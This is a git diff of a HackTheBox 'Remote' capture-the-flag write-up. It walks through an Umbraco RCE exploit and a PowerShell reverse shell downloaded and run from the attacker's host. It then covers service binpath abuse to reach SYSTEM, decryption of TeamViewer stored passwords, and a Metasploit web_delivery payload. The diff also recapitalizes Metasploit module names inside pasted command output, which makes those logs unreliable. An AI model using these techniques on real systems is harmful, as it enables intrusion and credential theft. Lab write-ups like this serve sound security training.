@@ -1,30 +1,30 @@
 ---
 title: "HackTheBox — Remote Writeup"
-date: 2020-09-07 21:06:00 +0530
+date: 2020-09-08 14:06:00 +0530
 categories: [HackTheBox,Windows Machines]
-tags: [NFS, winpeas, umbraco, john, teamviewer, crackmapexec, Nishang, usosvc, decrypt, AES, remote]
+tags: [NFS, winpeas, umbraco, john, TeamViewer, crackmapexec, Nishang, usosvc, decrypt, AES, remote]
 image: /assets/img/Posts/Remote.png
 ---
 
-> Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the crendentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the serice `UsoSvc` to get a shell as Administrator and later we will extract Administrator crendentials from an outdated version of Teamviewer installed on the machine. Lastly, we will also exploit Teamviewer using Metasploit.
+> Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service `UsoSvc` to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit.
 
 ## Tasks
 
-- Mount the NFS share and discover Umbraco crendentials inside SDF file
+- Mount the NFS share and discover Umbraco credentials inside SDF file
 - Crack the password hash using `john`
-- Login the Umbraco application and discover the version
-- Exploit Umbraco to get a shell
+- Login to Umbraco application and discover the version
+- Exploit Umbraco to get a reverse shell
 - Testing Umbraco exploit by `noraj`
 - Run `winPEAS.exe` on the machine
 - PrivEsc-1 Abuse the `UsoSvc` service
-- PrivEsc-2 Extract the crendentials from Teamviewer registry and decrypt it
-- PrivEsc-3 Autopwn using Teamvier Metasploit module
+- PrivEsc-2 Extract admin credentials from TeamViewer registry and decrypt it
+- PrivEsc-3 Autopwn using TeamViewer Metasploit module
 
 ## Reconnaissance
 
 Lets start out with `masscan` and `Nmap` to find out open ports and services:
 
-```console
+```shell
 cfx:  ~/Documents/htb/remote
 → masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.180
 
@@ -48,12 +48,6 @@ Discovered open port 5985/tcp on 10.10.10.180
 Discovered open port 49680/tcp on 10.10.10.180
 Discovered open port 49664/tcp on 10.10.10.180
 Discovered open port 2049/tcp on 10.10.10.180
-
-cfx:  ~/Documents/htb/remote
-→ nmap -sC -sV -p445,49678,139,49679,21,80,135,49667,49666,111,470001,49665,5985,49680,49664,2049 10.10.10.180                                                                          
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 17:48 IST
-Ports specified must be between 0 and 65535 inclusive
-QUITTING!
 
 cfx:  ~/Documents/htb/remote
 → nmap -sC -sV -p445,49678,139,49679,21,80,135,49667,49666,111,47001,49665,5985,49680,49664,2049 10.10.10.180
@@ -122,11 +116,11 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 190.81 seconds
 ```
-`nmap` & `masscan` give us lots of Ports and services such as `HTTP, FTP, SMB, NFS` running on the machine.
+`nmap` & `masscan` give us lots of Ports and services such as `HTTP, FTP, SMB, NFS` running on the machine, Lets enumerate them accordingly.
 
 ### FTP - Port 21
 
-Anonymous login is allowed but it's empty.
+Anonymous login is allowed but the directory is empty.
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -164,7 +158,7 @@ cfx:  ~/Documents/htb/remote
 SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
 ```
 
-Based on our results we could see Null Sessions are not working to enumerate shares. But using crackmapexec we were able to identify OS and Domain name.
+Based on our results we could see Null Sessions are not working to enumerate shares. With `crackmapexec` we were able to identify OS and Domain name.
 
 ### Website - Port 80
 
@@ -210,17 +204,17 @@ Output File: /opt/dirsearch/reports/10.10.10.180/20-09-06_17-53-02
 Task Completed
 ```
 
-Browsing various webpages we dont find anything intresting, However as we scroll down we see various posts and text refrences near the posts stating Website is running Umbraco CMS.
+Even after browsing various webpages we don't find anything interesting, However as we scroll down we see various posts and text references near the posts and page source indicating website is running Umbraco CMS.
 
 ![umbraco](/assets/img/Posts/Remote/umbraco.png)
 
-A little bit of googling reveals Umbraco admin login page is located at `/umbraco` of the application. But since we don't have any crendentials we will move on to enumerate `NFS`.
+A little bit of googling reveals Umbraco CMS admin login page is located at `/umbraco`. But since we don't have any credentials we will move on to enumerate `NFS`.
 
 ![umbracologin](/assets/img/Posts/Remote/login.png)
 
 ### NFS - Port 2049
 
-Using `showmount` to check which NFS share are accessible to mount and who can mount them.
+We will use `showmount` tool to check which NFS share are accessible to mount and who can mount them.
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -229,7 +223,7 @@ Export list for 10.10.10.180:
 /site_backups (everyone)
 ```
 
-we see site_backups is available to mount and is accessible to everyone, so we mount it to our machine and enumerate further.
+Based on the result we discover `site_backups` is available to mount and is accessible to everyone, so let's mount it to our machine and enumerate further.
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -259,7 +253,7 @@ drwx------  2 nobody 4294967294  4096 Feb 20  2020 Umbraco_Client
 drwx------  2 nobody 4294967294  4096 Feb 20  2020 Views
 -rwx------  1 nobody 4294967294 28539 Feb 20  2020 Web.config
 ```
-After looking at various files we come across a file named `Umbraco.sdf` inside the `/App_Data` folder and find Admin username and password hash at the top of the file.
+After looking at various files we come across a file named `Umbraco.sdf` inside the `/App_Data` folder and find Admin credentials at the top of the file.
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -270,7 +264,7 @@ Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1
 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
 ```
-`admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}` based on this line, we understand email is `admin@htb.local` and Admin's SHA1 hash `b8be16afba8c314ad33d812f22a04991b90e2aaa`
+`admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}` based on this line, we understand email-id of admin is `admin@htb.local` and password SHA1 hash is `b8be16afba8c314ad33d812f22a04991b90e2aaa`
 
 ### Cracking hash with John:
 
@@ -292,16 +286,16 @@ Session completed
 ```
 We get the password as `baconandcheese`
 
-Now we can login to Umbraco using `admin@htb.local` & password `baconandcheese`
+Now we can login to Umbraco using `admin@htb.local`:`baconandcheese`
 
 ## Umbraco Exploit
 
-Successfull login to Umbraco:
-If we click the `help` button on the Website, we see the `Umbraco Version 7.12.4`
+Successful login to Umbraco:
+As we click on the `help` button, we see the `Umbraco Version 7.12.4` based on this info we can search for exploits.
 
 ![umbracopage](/assets/img/Posts/Remote/page.png)
 
-Next, We find a possible authenticated exploit for Umbraco Version 7.12.4 same as our box on Exploit-DB: <https://www.exploit-db.com/exploits/46153>
+Using searchsploit we were able to find a possible authenticated exploit for Umbraco Version 7.12.4 same as our box on Exploit-DB: <https://www.exploit-db.com/exploits/46153>
 
 ```console
 cfx:  ~/Documents/htb/remote
@@ -311,9 +305,9 @@ Umbraco CMS 7.12.4 - (Authenticated) Remote Code   Execution                    
 Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                     | php/webapps/44988.txt
 ```
 
-### Modfying the exploit
+### Modifying the exploit
 
-The exploit needs some tweaking, We will make the following in the defult exploit code to get us an reverse shell:
+The exploit needs some tweaking, We will make the following changes in the default exploit script to get us an reverse shell:
 
 - login = "admin@htb.local"
 - password = "baconandcheese"
@@ -340,9 +334,9 @@ password="baconandcheese";
 host = "http://10.10.10.180";
 ```
 
-To sum it up, we have modified the payload which now uses `powershell.exe` with starting cmd.exe argument `-c` to download the Powershell reverse shell using `IWR`(Invoke-WebRequest) and execute it using `IEX` (Invoke-Expression).
+To sum it up, we have modified the payload which now uses `powershell.exe` with starting `cmd.exe` argument `-c` to download PowerShell reverse shell using `IWR`(Invoke-WebRequest) and execute it using `IEX` (Invoke-Expression).
 
-The payload is Oneliner Nishang reverse TCP shell:
+The payload we are using is One-liner Nishang reverse TCP shell:
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -352,7 +346,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.14',4444);$stream = 
 
 ## Shell as DefaultAppPool
 
-### Executing the exploit
+### Executing the modified exploit:
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -361,7 +355,7 @@ Start
 []
 ```
 
-### We see a hit on our http server for rev.ps1
+### We see a hit on our http server for our payload rev.ps1
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -369,7 +363,7 @@ cfx:  ~/Documents/htb/remote
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.10.180 - - [06/Sep/2020 19:03:59] "GET /rev.ps1 HTTP/1.1" 200 -
 ```
-### Getting a call back on our nc listener
+### Getting a call back on our `nc` listener
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -392,10 +386,10 @@ PS C:\Users\Public> get-content user.txt
 ```
 Inside the Public directory of Users, we can grab the `user.txt`
 
-## Umbrao Exploit by `noraj`
+## Umbraco Exploit by `noraj`
 
-We canalso use Umbraco exploit developed by `noraj` available [**here**](https://github.com/noraj/Umbraco-RCE)
-It's a similar exploit but to make this exploit work we don't have to modify the payload inside the script, instead it takes all the inputs as arguments.
+We can also use Umbraco exploit by `noraj` available [**here**](https://github.com/noraj/Umbraco-RCE)
+It's a similar exploit which takes all the inputs as arguments.
 
 ```shell
 cfx:  ~/Documents/htb/remote/Umbraco-RCE  |master ✓|
@@ -415,8 +409,6 @@ iis apppool\defaultapppool
 PS C:\windows\system32\inetsrv> exit
 ```
 
-
-
 ## Privilege Escalation
 
 First we will transfer `winPEAS.exe` on the machine and run to discover possible local privilege escalation vectors:
@@ -427,7 +419,9 @@ We will use `iwr` to transfer the binary
 PS C:\Windows\Temp> iwr -uri http://10.10.14.14:8000/winPEAS.exe -o winpeas.exe
 PS C:\Windows\Temp> ./winpeas.exe
 ```
-1. Looking at the output of `winPEAS.exe`, two things seemed intresting to me:
+Looking at the output of `winPEAS.exe`, two things seemed interesting to me:
+
+- First, We have full to a service named as `UsoSvC`
 
 ```console
 [+] Modifiable Services
@@ -436,7 +430,7 @@ PS C:\Windows\Temp> ./winpeas.exe
     UsoSvc: AllAccess, Start
 ```
 
-2. We also see an outdated version of Teamviewer is installed on the machine and running:
+- Second, We see an outdated version of TeamViewer is installed and running on the machine:
 
 ```console
 [+] Installed Applications --Via Program Files/Uninstall registry--
@@ -444,13 +438,13 @@ PS C:\Windows\Temp> ./winpeas.exe
 C:\Program Files (x86)\TeamViewer\Version7
 ```
 
-## PrivEsc 1: Abusing `UsoSvc`
+## PrivEsc 1: Abusing **UsoSvc** Service
 
 Since we have full access to `UsoSvc` service, we can modify the `binpath` of the service and pop us an reverse shell.
 
-`winPEAS` has also given us article <https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services> on how to abuse services
+`winPEAS` has also given us an article <https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services> on how to abuse services
 
-- Method 1: We will create a malicious reverse shell payload with `msfvenom` and transfer it on the machine and modify the `binpath` of `UsoSvC` with our payload.
+- Method 1: We will create a malicious reverse shell payload with `msfvenom`, transfer it on the machine and change the `binpath` of `UsoSvC` with our reverse shell payload.
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -462,7 +456,7 @@ Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 Saved as: priv.exe
 ```
-Transfering the payload:
+Transferring the payload:
 
 ```shell
 PS C:\Windows\Temp> iwr -uri http://10.10.14.14:8000/priv.exe -o priv.exe
@@ -474,7 +468,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.10.180 - - [06/Sep/2020 19:04:53] "GET /winPEAS.exe HTTP/1.1" 200 -
 10.10.10.180 - - [06/Sep/2020 19:15:44] "GET /priv.exe HTTP/1.1" 200 -
 ```
-### Modifying the `binpath`
+### Changing the `binpath`
 
 ```shell
 PS C:\Windows\Temp> sc.exe config usosvc binpath='C:\Windows\Temp\priv.exe'
@@ -517,9 +511,6 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 
-C:\Windows\system32>cd ../../Users/Administrator/Desktop
-cd ../../Users/Administrator/Desktop
-```
 ### Root Flag:
 
 ```shell
@@ -528,7 +519,7 @@ type root.txt
 4963d8d771c1fb09****************
 ```
 
-- Method 2: We will transfer `nc.exe` on the machine, change the `binpath` and get us a powershell reverse shell.
+- Method 2: We will transfer `nc.exe` binary on the machine, change the `binpath` and get us a PowerShell reverse shell.
 
 ```shell
 PS C:\Windows\Temp> iwr -uri http://10.10.14.14:8000/nc.exe -o nc.exe
@@ -579,9 +570,9 @@ TeamViewer_Service.exe        2964                            0     20,096 K
 VGAuthService.exe             3028                            0     10,068 K
 vmtoolsd.exe                  3036                            0     18,348 K
 ```
-I found an awesome article [**here**](https://whynotsecurity.com/blog/teamviewer/). Apparently, TV uses static keys to encrypt/decrypt crendentials of the stored password.
+I found an awesome article on TeamViewer [**here**](https://whynotsecurity.com/blog/TeamViewer/). Apparently, TV uses static keys to encrypt/decrypt credentials.
 
-These passwords are stored in the Windows registry inside the value `SecurityPasswordAES`, we can extract and decrypt them using the known `KEY` & `IV`.
+These passwords are stored in Windows registry inside the value `SecurityPasswordAES` which we can extract and decrypt them using the known `KEY` & `IV`.
 
 ### Key Points:
 
@@ -591,7 +582,7 @@ These passwords are stored in the Windows registry inside the value `SecurityPas
 
 ### Extracting Password
 
-Based on the version TeamViewer registry is under `HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7`
+A Quick search on Google reveals TeamViewer registry is under `HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7`
 
 ```shell
 PS C:\Windows\Temp> reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7
@@ -622,13 +613,13 @@ The value what we need is `SecurityPasswordAES    REG_BINARY  FF9B1C73D66BCE31AC
 
 ### Decrypt Script
 
-The author has also published an python code to decrypt the password in the blog or you can also find the script on [**my github**](https://github.com/ColdFusionX/CTF-Scripts/tree/master/HTB/Remote)
+The author has published a python script to decrypt the password on the blog or you can also find the script on [**my github**](https://github.com/ColdFusionX/CTF-Scripts/tree/master/HTB/Remote)
 
-We just need to replace the `hex_str_cipher` value with the encrypted data we found inside `SecurityPasswordAES` and run the script.
+We just need to replace the `hex_str_cipher` value with the encrypted data value we found inside `SecurityPasswordAES` and run the script.
 
 ```python
 cfx:  ~/Documents/htb/remote
-→ cat teamviewer_hash_decrypt.py
+→ cat TeamViewer_hash_decrypt.py
 import sys, hexdump, binascii
 from Crypto.Cipher import AES
 
@@ -654,21 +645,21 @@ password = raw_un.decode('utf-16')
 print(password)
 ```
 
-### Administrator crendentials
+### Administrator credentials
 
-Running the python decrypt script we get the Administrator crendentials as `!R3m0te!`
+Running the python decrypt script we get the Administrator credentials as `!R3m0te!`
 
 ```shell
 cfx:  ~/Documents/htb/remote
-→ python3 teamviewer_hash_decrypt.py
+→ python3 TeamViewer_hash_decrypt.py
 00000000: 21 00 52 00 33 00 6D 00  30 00 74 00 65 00 21 00  !.R.3.m.0.t.e.!.
 00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
 None
 !R3m0te!
 ```
-### Testing crendentials
+### Testing credentials
 
-We can test these crendentials using `crackmapexec`:
+We can test these credentials using `crackmapexec`:
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -676,9 +667,9 @@ cfx:  ~/Documents/htb/remote
 SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
 SMB         10.10.10.180    445    REMOTE           [+] remote\administrator:!R3m0te! (Pwn3d!)
 ```
-The `Pwn3d!` indicates we are got the correct crendentials for Administrator.
+The `Pwn3d!` indicates we are got the correct credentials for Administrator.
 
-We can use these crendentials to login as Administrator with `Evil-WinRM` or `psexec`
+We can use these credentials to login as Administrator with `Evil-WinRM` or `psexec`
 
 ```shell
 cfx:  ~/Documents/htb/remote
@@ -695,7 +686,7 @@ remote\administrator
 
 ## TeamViewer Module- Metasploit
 
-We can autopwn and find the crendentials using the Metasploit module,First we need to get a meterpreter reverse shell using `web_delivery` exploit module.
+We can autopwn and find the credentials using the Metasploit module, First we will get a `meterpreter` reverse shell using `web_delivery` exploit module.
 
 ```shell
 msf5 exploit(multi/script/web_delivery) > set RHOST 10.10.10.180
@@ -725,28 +716,28 @@ powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0
 [*] Meterpreter session 1 opened (10.10.14.14:4445 -> 10.10.10.180:49762) at 2020-09-06 21:40:49 +0530
 ```
 
-Now since we have a Meterpreter session 1 opened, we can use teamviewer module to find the crendentials:
+Now since we have a Meterpreter session 1 opened, we can use TeamViewer module to find the credentials:
 
 ```shell
-msf5 exploit(multi/script/web_delivery) > use post/windows/gather/credentials/teamviewer_passwords
-msf5 post(windows/gather/credentials/teamviewer_passwords) > show options
+msf5 exploit(multi/script/web_delivery) > use post/windows/gather/credentials/TeamViewer_passwords
+msf5 post(windows/gather/credentials/TeamViewer_passwords) > show options
 
-Module options (post/windows/gather/credentials/teamviewer_passwords):
+Module options (post/windows/gather/credentials/TeamViewer_passwords):
 
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    SESSION                        yes       The session to run this module on.
    WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer
 
-msf5 post(windows/gather/credentials/teamviewer_passwords) > set Session 1
+msf5 post(windows/gather/credentials/TeamViewer_passwords) > set Session 1
 Session => 1
-msf5 post(windows/gather/credentials/teamviewer_passwords) > run
+msf5 post(windows/gather/credentials/TeamViewer_passwords) > run
 
 [*] Finding TeamViewer Passwords on REMOTE
 [+] Found Unattended Password: !R3m0te!
-[+] Passwords stored in: /root/.msf4/loot/20200906214205_default_10.10.10.180_host.teamviewer__717224.txt
+[+] Passwords stored in: /root/.msf4/loot/20200906214205_default_10.10.10.180_host.TeamViewer__717224.txt
 ```
-We found the password `!R3m0te!` using Metasploit.
+We found the Administrator password `!R3m0te!` using Metasploit TeamViewer module.
 
 And we pwned the Box !
 
